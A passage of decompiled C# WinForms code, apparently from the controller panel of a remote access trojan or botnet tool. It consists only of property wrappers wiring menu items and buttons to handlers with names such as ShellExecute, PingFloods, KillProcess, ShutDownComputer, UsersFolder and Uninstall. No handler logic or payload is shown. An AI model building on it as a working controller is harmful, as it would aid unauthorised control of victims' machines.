		// (get) Token: 0x06000186 RID: 390 RVA: 0x00015AB4 File Offset: 0x00013CB4
		// (set) Token: 0x06000187 RID: 391 RVA: 0x00015ACC File Offset: 0x00013CCC
		internal virtual ToolStripMenuItem ToolStripMenuItem4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem4_Click);
				if (this._ToolStripMenuItem4 != null)
				{
					this._ToolStripMenuItem4.Click -= value2;
				}
				this._ToolStripMenuItem4 = value;
				if (this._ToolStripMenuItem4 != null)
				{
					this._ToolStripMenuItem4.Click += value2;
				}
			}
		}

		// Token: 0x170000AE RID: 174
		// (get) Token: 0x06000188 RID: 392 RVA: 0x00015B24 File Offset: 0x00013D24
		// (set) Token: 0x06000189 RID: 393 RVA: 0x00015B3C File Offset: 0x00013D3C
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				if (this._ToolStripMenuItem1 != null)
				{
					this._ToolStripMenuItem1.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				if (this._ToolStripMenuItem1 != null)
				{
					this._ToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000AF RID: 175
		// (get) Token: 0x0600018A RID: 394 RVA: 0x00015B94 File Offset: 0x00013D94
		// (set) Token: 0x0600018B RID: 395 RVA: 0x00015BAC File Offset: 0x00013DAC
		internal virtual ToolStripMenuItem ConnectionsToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ConnectionsToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ConnectionsToolStripMenuItem1_Click);
				if (this._ConnectionsToolStripMenuItem1 != null)
				{
					this._ConnectionsToolStripMenuItem1.Click -= value2;
				}
				this._ConnectionsToolStripMenuItem1 = value;
				if (this._ConnectionsToolStripMenuItem1 != null)
				{
					this._ConnectionsToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000B0 RID: 176
		// (get) Token: 0x0600018C RID: 396 RVA: 0x00015C04 File Offset: 0x00013E04
		// (set) Token: 0x0600018D RID: 397 RVA: 0x00015C1C File Offset: 0x00013E1C
		internal virtual ToolStripMenuItem SendRunToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SendRunToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SendRunToolStripMenuItem_Click);
				if (this._SendRunToolStripMenuItem != null)
				{
					this._SendRunToolStripMenuItem.Click -= value2;
				}
				this._SendRunToolStripMenuItem = value;
				if (this._SendRunToolStripMenuItem != null)
				{
					this._SendRunToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000B1 RID: 177
		// (get) Token: 0x0600018E RID: 398 RVA: 0x00015C74 File Offset: 0x00013E74
		// (set) Token: 0x0600018F RID: 399 RVA: 0x00015C8C File Offset: 0x00013E8C
		internal virtual ToolStripMenuItem UpdateToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UpdateToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UpdateToolStripMenuItem1_Click);
				if (this._UpdateToolStripMenuItem1 != null)
				{
					this._UpdateToolStripMenuItem1.Click -= value2;
				}
				this._UpdateToolStripMenuItem1 = value;
				if (this._UpdateToolStripMenuItem1 != null)
				{
					this._UpdateToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000B2 RID: 178
		// (get) Token: 0x06000190 RID: 400 RVA: 0x00015CE4 File Offset: 0x00013EE4
		// (set) Token: 0x06000191 RID: 401 RVA: 0x00002CCD File Offset: 0x00000ECD
		internal virtual ToolStripSeparator ToolStripSeparator3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator3 = value;
			}
		}

		// Token: 0x170000B3 RID: 179
		// (get) Token: 0x06000192 RID: 402 RVA: 0x00015CFC File Offset: 0x00013EFC
		// (set) Token: 0x06000193 RID: 403 RVA: 0x00015D14 File Offset: 0x00013F14
		internal virtual ToolStripMenuItem RestartToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RestartToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestartToolStripMenuItem1_Click);
				if (this._RestartToolStripMenuItem1 != null)
				{
					this._RestartToolStripMenuItem1.Click -= value2;
				}
				this._RestartToolStripMenuItem1 = value;
				if (this._RestartToolStripMenuItem1 != null)
				{
					this._RestartToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000B4 RID: 180
		// (get) Token: 0x06000194 RID: 404 RVA: 0x00015D6C File Offset: 0x00013F6C
		// (set) Token: 0x06000195 RID: 405 RVA: 0x00015D84 File Offset: 0x00013F84
		internal virtual ToolStripMenuItem UinstallToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UinstallToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UinstallToolStripMenuItem_Click);
				if (this._UinstallToolStripMenuItem != null)
				{
					this._UinstallToolStripMenuItem.Click -= value2;
				}
				this._UinstallToolStripMenuItem = value;
				if (this._UinstallToolStripMenuItem != null)
				{
					this._UinstallToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000B5 RID: 181
		// (get) Token: 0x06000196 RID: 406 RVA: 0x00015DDC File Offset: 0x00013FDC
		// (set) Token: 0x06000197 RID: 407 RVA: 0x00015DF4 File Offset: 0x00013FF4
		internal virtual ToolStripMenuItem CloseToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CloseToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CloseToolStripMenuItem1_Click);
				if (this._CloseToolStripMenuItem1 != null)
				{
					this._CloseToolStripMenuItem1.Click -= value2;
				}
				this._CloseToolStripMenuItem1 = value;
				if (this._CloseToolStripMenuItem1 != null)
				{
					this._CloseToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000B6 RID: 182
		// (get) Token: 0x06000198 RID: 408 RVA: 0x00015E4C File Offset: 0x0001404C
		// (set) Token: 0x06000199 RID: 409 RVA: 0x00015E64 File Offset: 0x00014064
		internal virtual ToolStripMenuItem UsersFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UsersFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UsersFolderToolStripMenuItem_Click);
				if (this._UsersFolderToolStripMenuItem != null)
				{
					this._UsersFolderToolStripMenuItem.Click -= value2;
				}
				this._UsersFolderToolStripMenuItem = value;
				if (this._UsersFolderToolStripMenuItem != null)
				{
					this._UsersFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000B7 RID: 183
		// (get) Token: 0x0600019A RID: 410 RVA: 0x00015EBC File Offset: 0x000140BC
		// (set) Token: 0x0600019B RID: 411 RVA: 0x00015ED4 File Offset: 0x000140D4
		internal virtual ToolStripMenuItem DisconnectServerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DisconnectServerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DisconnectServerToolStripMenuItem_Click);
				if (this._DisconnectServerToolStripMenuItem != null)
				{
					this._DisconnectServerToolStripMenuItem.Click -= value2;
				}
				this._DisconnectServerToolStripMenuItem = value;
				if (this._DisconnectServerToolStripMenuItem != null)
				{
					this._DisconnectServerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000B8 RID: 184
		// (get) Token: 0x0600019C RID: 412 RVA: 0x00015F2C File Offset: 0x0001412C
		// (set) Token: 0x0600019D RID: 413 RVA: 0x00002CD6 File Offset: 0x00000ED6
		internal virtual ToolStripSeparator ToolStripSeparator4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator4 = value;
			}
		}

		// Token: 0x170000B9 RID: 185
		// (get) Token: 0x0600019E RID: 414 RVA: 0x00015F44 File Offset: 0x00014144
		// (set) Token: 0x0600019F RID: 415 RVA: 0x00002CDF File Offset: 0x00000EDF
		internal virtual ToolStripMenuItem CommandsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CommandsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CommandsToolStripMenuItem = value;
			}
		}

		// Token: 0x170000BA RID: 186
		// (get) Token: 0x060001A0 RID: 416 RVA: 0x00015F5C File Offset: 0x0001415C
		// (set) Token: 0x060001A1 RID: 417 RVA: 0x00015F74 File Offset: 0x00014174
		internal virtual ToolStripMenuItem ShellExecuteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ShellExecuteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShellExecuteToolStripMenuItem_Click);
				if (this._ShellExecuteToolStripMenuItem != null)
				{
					this._ShellExecuteToolStripMenuItem.Click -= value2;
				}
				this._ShellExecuteToolStripMenuItem = value;
				if (this._ShellExecuteToolStripMenuItem != null)
				{
					this._ShellExecuteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000BB RID: 187
		// (get) Token: 0x060001A2 RID: 418 RVA: 0x00015FCC File Offset: 0x000141CC
		// (set) Token: 0x060001A3 RID: 419 RVA: 0x00015FE4 File Offset: 0x000141E4
		internal virtual ToolStripMenuItem OpenWebPageToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenWebPageToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenWebPageToolStripMenuItem_Click);
				if (this._OpenWebPageToolStripMenuItem != null)
				{
					this._OpenWebPageToolStripMenuItem.Click -= value2;
				}
				this._OpenWebPageToolStripMenuItem = value;
				if (this._OpenWebPageToolStripMenuItem != null)
				{
					this._OpenWebPageToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000BC RID: 188
		// (get) Token: 0x060001A4 RID: 420 RVA: 0x0001603C File Offset: 0x0001423C
		// (set) Token: 0x060001A5 RID: 421 RVA: 0x00016054 File Offset: 0x00014254
		internal virtual ToolStripMenuItem PingFloodsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PingFloodsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PingFloodsToolStripMenuItem_Click);
				if (this._PingFloodsToolStripMenuItem != null)
				{
					this._PingFloodsToolStripMenuItem.Click -= value2;
				}
				this._PingFloodsToolStripMenuItem = value;
				if (this._PingFloodsToolStripMenuItem != null)
				{
					this._PingFloodsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000BD RID: 189
		// (get) Token: 0x060001A6 RID: 422 RVA: 0x000160AC File Offset: 0x000142AC
		// (set) Token: 0x060001A7 RID: 423 RVA: 0x000160C4 File Offset: 0x000142C4
		internal virtual ToolStripMenuItem KillProcessToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KillProcessToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.KillProcessToolStripMenuItem_Click);
				if (this._KillProcessToolStripMenuItem != null)
				{
					this._KillProcessToolStripMenuItem.Click -= value2;
				}
				this._KillProcessToolStripMenuItem = value;
				if (this._KillProcessToolStripMenuItem != null)
				{
					this._KillProcessToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000BE RID: 190
		// (get) Token: 0x060001A8 RID: 424 RVA: 0x0001611C File Offset: 0x0001431C
		// (set) Token: 0x060001A9 RID: 425 RVA: 0x00016134 File Offset: 0x00014334
		internal virtual ToolStripMenuItem NewTaskRunToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewTaskRunToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NewTaskRunToolStripMenuItem_Click);
				if (this._NewTaskRunToolStripMenuItem != null)
				{
					this._NewTaskRunToolStripMenuItem.Click -= value2;
				}
				this._NewTaskRunToolStripMenuItem = value;
				if (this._NewTaskRunToolStripMenuItem != null)
				{
					this._NewTaskRunToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000BF RID: 191
		// (get) Token: 0x060001AA RID: 426 RVA: 0x0001618C File Offset: 0x0001438C
		// (set) Token: 0x060001AB RID: 427 RVA: 0x000161A4 File Offset: 0x000143A4
		internal virtual ToolStripMenuItem RestartComputerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RestartComputerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestartComputerToolStripMenuItem_Click);
				if (this._RestartComputerToolStripMenuItem != null)
				{
					this._RestartComputerToolStripMenuItem.Click -= value2;
				}
				this._RestartComputerToolStripMenuItem = value;
				if (this._RestartComputerToolStripMenuItem != null)
				{
					this._RestartComputerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000C0 RID: 192
		// (get) Token: 0x060001AC RID: 428 RVA: 0x000161FC File Offset: 0x000143FC
		// (set) Token: 0x060001AD RID: 429 RVA: 0x00016214 File Offset: 0x00014414
		internal virtual ToolStripMenuItem LogOffComputerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogOffComputerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.LogOffComputerToolStripMenuItem_Click);
				if (this._LogOffComputerToolStripMenuItem != null)
				{
					this._LogOffComputerToolStripMenuItem.Click -= value2;
				}
				this._LogOffComputerToolStripMenuItem = value;
				if (this._LogOffComputerToolStripMenuItem != null)
				{
					this._LogOffComputerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000C1 RID: 193
		// (get) Token: 0x060001AE RID: 430 RVA: 0x0001626C File Offset: 0x0001446C
		// (set) Token: 0x060001AF RID: 431 RVA: 0x00016284 File Offset: 0x00014484
		internal virtual ToolStripMenuItem ShutDownComputerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ShutDownComputerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShutDownComputerToolStripMenuItem_Click);
				if (this._ShutDownComputerToolStripMenuItem != null)
				{
					this._ShutDownComputerToolStripMenuItem.Click -= value2;
				}
				this._ShutDownComputerToolStripMenuItem = value;
				if (this._ShutDownComputerToolStripMenuItem != null)
				{
					this._ShutDownComputerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000C2 RID: 194
		// (get) Token: 0x060001B0 RID: 432 RVA: 0x000162DC File Offset: 0x000144DC
		// (set) Token: 0x060001B1 RID: 433 RVA: 0x000162F4 File Offset: 0x000144F4
		internal virtual ToolStripMenuItem RenameServerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RenameServerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RenameServerToolStripMenuItem_Click);
				if (this._RenameServerToolStripMenuItem != null)
				{
					this._RenameServerToolStripMenuItem.Click -= value2;
				}
				this._RenameServerToolStripMenuItem = value;
				if (this._RenameServerToolStripMenuItem != null)
				{
					this._RenameServerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000C3 RID: 195
		// (get) Token: 0x060001B2 RID: 434 RVA: 0x0001634C File Offset: 0x0001454C
		// (set) Token: 0x060001B3 RID: 435 RVA: 0x00002CE8 File Offset: 0x00000EE8
		internal virtual TextBox PWD
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PWD;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PWD = value;
			}
		}

		// Token: 0x170000C4 RID: 196
		// (get) Token: 0x060001B4 RID: 436 RVA: 0x00016364 File Offset: 0x00014564
		// (set) Token: 0x060001B5 RID: 437 RVA: 0x00002CF1 File Offset: 0x00000EF1
		internal virtual TextBox USR
		{
			[DebuggerNonUserCode]
			get
			{
				return this._USR;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._USR = value;
			}
		}

		// Token: 0x170000C5 RID: 197
		// (get) Token: 0x060001B6 RID: 438 RVA: 0x0001637C File Offset: 0x0001457C
		// (set) Token: 0x060001B7 RID: 439 RVA: 0x00002CFA File Offset: 0x00000EFA
		internal virtual ImageList IMGNEWS
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IMGNEWS;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._IMGNEWS = value;
			}
		}

		// Token: 0x170000C6 RID: 198
		// (get) Token: 0x060001B8 RID: 440 RVA: 0x00016394 File Offset: 0x00014594
		// (set) Token: 0x060001B9 RID: 441 RVA: 0x000163AC File Offset: 0x000145AC
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				if (this._Timer1 != null)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				if (this._Timer1 != null)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x060001BA RID: 442 RVA: 0x00016404 File Offset: 0x00014604
		// (set) Token: 0x060001BB RID: 443 RVA: 0x0001641C File Offset: 0x0001461C
		internal virtual Button Button8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button8_Click);
				if (this._Button8 != null)
				{
					this._Button8.Click -= value2;
				}
				this._Button8 = value;
				if (this._Button8 != null)
				{
					this._Button8.Click += value2;
				}
			}
		}

		// Token: 0x170000C8 RID: 200
		// (get) Token: 0x060001BC RID: 444 RVA: 0x00016474 File Offset: 0x00014674
		// (set) Token: 0x060001BD RID: 445 RVA: 0x0001648C File Offset: 0x0001468C
		internal virtual Button Button9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button9_Click);
				if (this._Button9 != null)
				{
					this._Button9.Click -= value2;
				}
				this._Button9 = value;
				if (this._Button9 != null)
				{
					this._Button9.Click += value2;
				}
			}
		}

		// Token: 0x170000C9 RID: 201
		// (get) Token: 0x060001BE RID: 446 RVA: 0x000164E4 File Offset: 0x000146E4
		// (set) Token: 0x060001BF RID: 447 RVA: 0x000164FC File Offset: 0x000146FC
		internal virtual Button Button10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button10_Click);
				if (this._Button10 != null)
				{
					this._Button10.Click -= value2;
				}
				this._Button10 = value;
				if (this._Button10 != null)
				{
					this._Button10.Click += value2;
				}
			}
		}

		// Token: 0x170000CA RID: 202
		// (get) Token: 0x060001C0 RID: 448 RVA: 0x00016554 File Offset: 0x00014754
		// (set) Token: 0x060001C1 RID: 449 RVA: 0x00002D03 File Offset: 0x00000F03
		internal virtual ToolStripMenuItem ServerShieldToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ServerShieldToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ServerShieldToolStripMenuItem = value;
			}
		}

		// Token: 0x170000CB RID: 203
		// (get) Token: 0x060001C2 RID: 450 RVA: 0x0001656C File Offset: 0x0001476C
		// (set) Token: 0x060001C3 RID: 451 RVA: 0x00002D0C File Offset: 0x00000F0C
		internal virtual ControlBuilder ControlBuilder1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ControlBuilder1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ControlBuilder1 = value;
			}
		}

		// Token: 0x170000CC RID: 204
		// (get) Token: 0x060001C4 RID: 452 RVA: 0x00016584 File Offset: 0x00014784
		// (set) Token: 0x060001C5 RID: 453 RVA: 0x00002D15 File Offset: 0x00000F15
		internal virtual Panel Pnews
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Pnews;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Pnews = value;
			}
		}

		// Token: 0x170000CD RID: 205
		// (get) Token: 0x060001C6 RID: 454 RVA: 0x0001659C File Offset: 0x0001479C
		// (set) Token: 0x060001C7 RID: 455 RVA: 0x00002D1E File Offset: 0x00000F1E
		internal virtual Panel PanelNews
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PanelNews;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PanelNews = value;
			}
		}

		// Token: 0x170000CE RID: 206
		// (get) Token: 0x060001C8 RID: 456 RVA: 0x000165B4 File Offset: 0x000147B4
		// (set) Token: 0x060001C9 RID: 457 RVA: 0x00002D27 File Offset: 0x00000F27
		internal virtual Panel Panel4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel4 = value;
			}
		}

		// Token: 0x170000CF RID: 207
		// (get) Token: 0x060001CA RID: 458 RVA: 0x000165CC File Offset: 0x000147CC
		// (set) Token: 0x060001CB RID: 459 RVA: 0x000165E4 File Offset: 0x000147E4
		internal virtual Button B3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._B3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.B3_Click);
				if (this._B3 != null)
				{
					this._B3.Click -= value2;
				}
				this._B3 = value;
				if (this._B3 != null)
				{
					this._B3.Click += value2;
				}
			}
		}

		// Token: 0x170000D0 RID: 208
		// (get) Token: 0x060001CC RID: 460 RVA: 0x0001663C File Offset: 0x0001483C
		// (set) Token: 0x060001CD RID: 461 RVA: 0x00016654 File Offset: 0x00014854
		internal virtual Button B2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._B2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.B2_Click);
				if (this._B2 != null)
				{
					this._B2.Click -= value2;
				}
				this._B2 = value;
				if (this._B2 != null)
				{
					this._B2.Click += value2;
				}
			}
		}

		// Token: 0x170000D1 RID: 209
		// (get) Token: 0x060001CE RID: 462 RVA: 0x000166AC File Offset: 0x000148AC
		// (set) Token: 0x060001CF RID: 463 RVA: 0x000166C4 File Offset: 0x000148C4
		internal virtual Button B1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._B1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.B1_Click);
				if (this._B1 != null)
				{
					this._B1.Click -= value2;
				}
				this._B1 = value;
				if (this._B1 != null)
				{
					this._B1.Click += value2;
				}
			}
		}

		// Token: 0x170000D2 RID: 210
		// (get) Token: 0x060001D0 RID: 464 RVA: 0x0001671C File Offset: 0x0001491C
		// (set) Token: 0x060001D1 RID: 465 RVA: 0x00016734 File Offset: 0x00014934
		internal virtual Button B4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._B4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.B4_Click);
				if (this._B4 != null)
				{
					this._B4.Click -= value2;
				}
				this._B4 = value;
				if (this._B4 != null)
				{
					this._B4.Click += value2;
				}
			}
		}

		// Token: 0x170000D3 RID: 211
		// (get) Token: 0x060001D2 RID: 466 RVA: 0x0001678C File Offset: 0x0001498C
		// (set) Token: 0x060001D3 RID: 467 RVA: 0x000167A4 File Offset: 0x000149A4
		internal virtual ToolStripMenuItem WindowsListToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._WindowsListToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.WindowsListToolStripMenuItem_Click);
				if (this._WindowsListToolStripMenuItem != null)
				{
					this._WindowsListToolStripMenuItem.Click -= value2;
				}
				this._WindowsListToolStripMenuItem = value;
				if (this._WindowsListToolStripMenuItem != null)
				{
					this._WindowsListToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000D4 RID: 212
		// (get) Token: 0x060001D4 RID: 468 RVA: 0x000167FC File Offset: 0x000149FC
		// (set) Token: 0x060001D5 RID: 469 RVA: 0x00016814 File Offset: 0x00014A14
		internal virtual ToolStripMenuItem ToolStripMenuItem7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem7_Click);
				if (this._ToolStripMenuItem7 != null)
				{
					this._ToolStripMenuItem7.Click -= value2;
				}
				this._ToolStripMenuItem7 = value;
				if (this._ToolStripMenuItem7 != null)
				{
					this._ToolStripMenuItem7.Click += value2;
				}
			}
		}

		// Token: 0x170000D5 RID: 213
		// (get) Token: 0x060001D6 RID: 470 RVA: 0x0001686C File Offset: 0x00014A6C
		// (set) Token: 0x060001D7 RID: 471 RVA: 0x00002D30 File Offset: 0x00000F30
		internal virtual GroupDropBox GroupDropBox10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox10 = value;
			}
		}

		// Token: 0x170000D6 RID: 214
		// (get) Token: 0x060001D8 RID: 472 RVA: 0x00016884 File Offset: 0x00014A84
		// (set) Token: 0x060001D9 RID: 473 RVA: 0x00002D39 File Offset: 0x00000F39
		internal virtual GroupDropBox GroupDropBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox3 = value;
			}
		}

		// Token: 0x170000D7 RID: 215
		// (get) Token: 0x060001DA RID: 474 RVA: 0x0001689C File Offset: 0x00014A9C
		// (set) Token: 0x060001DB RID: 475 RVA: 0x00002D42 File Offset: 0x00000F42
		internal virtual GroupDropBox GroupDropBox4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox4 = value;
			}
		}

		// Token: 0x170000D8 RID: 216
		// (get) Token: 0x060001DC RID: 476 RVA: 0x000168B4 File Offset: 0x00014AB4
		// (set) Token: 0x060001DD RID: 477 RVA: 0x00002D4B File Offset: 0x00000F4B
		internal virtual GroupDropBox GroupDropBox8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox8 = value;
			}
		}

		// Token: 0x170000D9 RID: 217
		// (get) Token: 0x060001DE RID: 478 RVA: 0x000168CC File Offset: 0x00014ACC
		// (set) Token: 0x060001DF RID: 479 RVA: 0x00002D54 File Offset: 0x00000F54
		internal virtual GroupDropBox GroupDropBox7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox7;
			}
			[DebuggerNonUserCode]
